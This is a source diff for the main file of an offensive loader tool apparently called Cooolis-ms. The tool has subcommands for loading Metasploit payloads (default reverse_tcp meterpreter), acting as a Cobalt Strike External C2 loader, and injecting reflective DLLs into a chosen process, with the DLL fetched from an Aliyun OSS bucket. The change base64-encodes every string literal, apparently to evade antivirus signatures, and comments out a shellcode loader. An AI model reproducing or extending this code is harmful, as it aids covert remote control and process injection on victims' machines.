@@ -25,9 +25,11 @@ e.g.  Cooolis-ms-x86.exe reflective -b XXX.oss-cn-XXX.aliyuncs.com -u /reflectiv
 #include "Cooolis-Reflective.h"
 #include "Cooolis-Http.h"
 #include "Cooolis-Shellcode.h"
+#include "Cooolis-String.h"
 #include "rang.hpp"
 #include "CLI11.hpp"
 #include <codecvt> 
+
 
 int main(int argc, char** argv)
 {
@@ -46,19 +48,19 @@ int main(int argc, char** argv)
 
 
 	// [Metasploit]
-	auto metasploit = app.add_subcommand("metasploit", "Metasploit RPC Loader");
+	auto metasploit = app.add_subcommand(CooolisString("bWV0YXNwbG9pdA=="), CooolisString("TWV0YXNwbG9pdCBSUEMgTG9hZGVy"));
 	
 
-	metasploit->add_option("-p,--payload", msf_payload, "Payload Name, e.g. windows/meterpreter/reverse_tcp")->default_str("windows/meterpreter/reverse_tcp");
-	metasploit->add_option("-o,--options", msf_options, "Payload options, e.g. LHOST=1.1.1.1,LPORT=8866");
+	metasploit->add_option(CooolisString("LXAsLS1wYXlsb2Fk"), msf_payload, CooolisString("UGF5bG9hZCBOYW1lLCBlLmcuIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV90Y3A="))->default_str(CooolisString("d2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX3RjcA=="));
+	metasploit->add_option(CooolisString("LW8sLS1vcHRpb25z"), msf_options, CooolisString("UGF5bG9hZCBvcHRpb25zLCBlLmcuIExIT1NUPTEuMS4xLjEsTFBPUlQ9ODg2Ng=="));
 	
 
-	metasploit->add_option("-P,--PORT", server_port, "RPC Server Port")->check(CLI::Range(1, 65535))->default_val(8899)->required();
-	metasploit->add_option("-H,--HOST", server_host, "RPC Server Host")->check(CLI::ValidIPV4)->required();
+	metasploit->add_option(CooolisString("LVAsLS1QT1JU"), server_port, CooolisString("UlBDIFNlcnZlciBQb3J0"))->check(CLI::Range(1, 65535))->default_val(8899)->required();
+	metasploit->add_option(CooolisString("LUgsLS1IT1NU"), server_host, CooolisString("UlBDIFNlcnZlciBIb3N0"))->check(CLI::ValidIPV4)->required();
 
 	metasploit->callback([&]() {
 		if (msf_options.length() > 200 || msf_payload.length() > 200) {
-			std::cout << rang::bg::red << rang::style::bold << rang::fg::cyan << "PType And POptions Too long!" << std::endl;
+			std::cout << rang::bg::red << rang::style::bold << rang::fg::cyan << (std::string)CooolisString("UFR5cGUgQW5kIFBPcHRpb25zIFRvbyBsb25nIQ==") << std::endl;
 		}
 		else {
 			CCooolisMetasploit* CooolisMSF = new CCooolisMetasploit;
@@ -74,9 +76,9 @@ int main(int argc, char** argv)
 	});
 
 	// [Cobaltstrike]
-	auto cobaltstrike = app.add_subcommand("cobaltstrike", "Cobalt Strike External C2 Loader");
-	cobaltstrike->add_option("-P,--PORT", server_port, "External C2 Port")->check(CLI::Range(1, 65535))->required();
-	cobaltstrike->add_option("-H,--HOST", server_host, "External C2 Host")->check(CLI::ValidIPV4)->required();
+	auto cobaltstrike = app.add_subcommand(CooolisString("Y29iYWx0c3RyaWtl"), CooolisString("Q29iYWx0IFN0cmlrZSBFeHRlcm5hbCBDMiBMb2FkZXI="));
+	cobaltstrike->add_option(CooolisString("LVAsLS1QT1JU"), server_port, CooolisString("RXh0ZXJuYWwgQzIgUG9ydA=="))->check(CLI::Range(1, 65535))->required();
+	cobaltstrike->add_option(CooolisString("LUgsLS1IT1NU"), server_host, CooolisString("RXh0ZXJuYWwgQzIgSG9zdA=="))->check(CLI::ValidIPV4)->required();
 
 	cobaltstrike->callback([&]() {
 		CCooolisExternalC2* CooolisCobaltstrike = new CCooolisExternalC2;
@@ -88,11 +90,11 @@ int main(int argc, char** argv)
 	});
 
 	// [Reflective]
-	auto reflective = app.add_subcommand("reflective", "Reflective DLL injection");
-	reflective->add_option("-f,--file", reflective_file, "Reflective DLL Path")->check(CLI::ExistingFile);
-	reflective->add_option("-u,--uri", reflective_uri_file, "Reflective DLL URI");
-	reflective->add_option("-b,--bucket", reflective_oss_bucket, "Reflective DLL OSS Bucket");
-	reflective->add_option("-p,--pid", dwReflectiveProcessId, "Reflective Inject Process Id")->default_val(GetCurrentProcessId());
+	auto reflective = app.add_subcommand(CooolisString("cmVmbGVjdGl2ZQ=="), CooolisString("UmVmbGVjdGl2ZSBETEwgaW5qZWN0aW9u"));
+	reflective->add_option(CooolisString("LWYsLS1maWxl"), reflective_file, CooolisString("UmVmbGVjdGl2ZSBETEwgUGF0aA=="))->check(CLI::ExistingFile);
+	reflective->add_option(CooolisString("LXUsLS11cmk="), reflective_uri_file, CooolisString("UmVmbGVjdGl2ZSBETEwgVVJJ"));
+	reflective->add_option(CooolisString("LWIsLS1idWNrZXQ="), reflective_oss_bucket, CooolisString("UmVmbGVjdGl2ZSBETEwgT1NTIEJ1Y2tldA=="));
+	reflective->add_option(CooolisString("LXAsLS1waWQ="), dwReflectiveProcessId, CooolisString("UmVmbGVjdGl2ZSBJbmplY3QgUHJvY2VzcyBJZA=="))->default_val(GetCurrentProcessId());
 
 	reflective->callback([&]() {
 		CCooolisReflective* CooolisReflective = new CCooolisReflective;
@@ -102,7 +104,7 @@ int main(int argc, char** argv)
 		}else {
 			// 如果oss bucket和URI为空，则抛出错误提示
 			if (reflective_oss_bucket.empty() || reflective_uri_file.empty()) {
-				std::cout << "[*] The Bucket or Reflective DLL URI is Empty." << std::endl;
+				std::cout << (std::string)CooolisString("WypdIFRoZSBCdWNrZXQgb3IgUmVmbGVjdGl2ZSBETEwgVVJJIGlzIEVtcHR5Lg==") << std::endl;
 				std::cout << app.help() << std::endl;
 				return FALSE;
 			}
@@ -121,7 +123,7 @@ int main(int argc, char** argv)
 
 			// 连接OSS
 			if (!CooolisHttp->ConnectServer(reflective_oss_bucket_ws.data(), 443)) {
-				std::cout << "[*] Can't Connect Aliyun Bucket." << std::endl;
+				std::cout << (std::string)CooolisString("WypdIENhbid0IENvbm5lY3QgQWxpeXVuIEJ1Y2tldC4=") << std::endl;
 				std::cout << app.help() << std::endl;
 				return FALSE;
 			}
@@ -138,10 +140,10 @@ int main(int argc, char** argv)
 		return TRUE;
 	});
 
-
+	/*
 	// [Shellcode]
-	auto shellcode = app.add_subcommand("shellcode", "Shellcode Loader");
-	shellcode->add_option("-f,--file", shellcode_file, "Shellcode Path")->check(CLI::ExistingFile);
+	auto shellcode = app.add_subcommand(CooolisString("c2hlbGxjb2Rl"), CooolisString("U2hlbGxjb2RlIExvYWRlcg=="));
+	shellcode->add_option(CooolisString("LWYsLS1maWxl"), shellcode_file, CooolisString("U2hlbGxjb2RlIFBhdGg="))->check(CLI::ExistingFile);
 
 	shellcode->callback([&]() {
 		DWORD dwFileSize = 0;
@@ -157,7 +159,7 @@ int main(int argc, char** argv)
 		return TRUE;
 	});
 
-
+	*/
 	try {
 		CLI11_PARSE(app, argc, argv);
 	}
@@ -167,5 +169,7 @@ int main(int argc, char** argv)
 	}
 
 	return GetLastError();
+
+	
 }
 
